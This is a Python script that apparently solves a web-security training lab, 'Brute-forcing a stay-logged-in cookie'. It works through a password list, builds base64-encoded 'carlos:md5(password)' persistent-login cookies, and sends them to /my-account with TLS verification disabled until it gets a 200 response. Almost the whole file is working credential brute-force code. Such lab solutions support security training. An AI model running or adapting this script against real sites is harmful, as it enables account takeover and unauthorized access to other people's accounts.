import requests
import time
import hashlib
import base64
from colorama import Fore

LAB_NAME = "Brute-forcing a stay-logged-in cookie"
SCRIPT_START_TIME = time.time()


def run(url, payload=None, proxies=None):
    url = url.rstrip("/")
    print("[1] Reading password list.. ", end="", flush=True)

    try:
        password_list = open("passwords.txt", 'r').read().splitlines()
        print(Fore.GREEN + "OK")
    except Exception as e:
        print(Fore.RED + f"\n[!] Failed to open passwords.txt: {e}")
        return False

    print(Fore.WHITE + "[2] Brute forcing carlos password..")

    for counter, password in enumerate(password_list):
        hashed = hashlib.md5(password.encode()).hexdigest()
        cookie_value = f"carlos:{hashed}"
        cookie_encoded = base64.b64encode(cookie_value.encode()).decode()
        cookies = {"stay-logged-in": cookie_encoded}

        try:
            res = requests.get(f"{url}/my-account", cookies=cookies, proxies=proxies or {}, verify=False, allow_redirects=False)
        except Exception as e:
            print(Fore.RED + f"\n[!] Failed to GET /my-account: {e}")
            return False

        if res.status_code == 200:
            print(Fore.GREEN + f"\n🗹 Valid password found: {Fore.YELLOW}{password}")
            print_finish_message()
            return True
        else:
            print_progress(counter, len(password_list), password)

    print(Fore.RED + "[!] No valid password found")
    return False


def print_progress(counter, total, password):
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(Fore.WHITE + f"⧖ Elapsed: {elapsed}s || Trying ({counter+1}/{total}): " +
          Fore.BLUE + f"{password:50}", end="\r", flush=True)


def print_finish_message():
    elapsed = int(time.time() - SCRIPT_START_TIME)
    print(Fore.WHITE + f"\n🗹 Finished in {elapsed} seconds")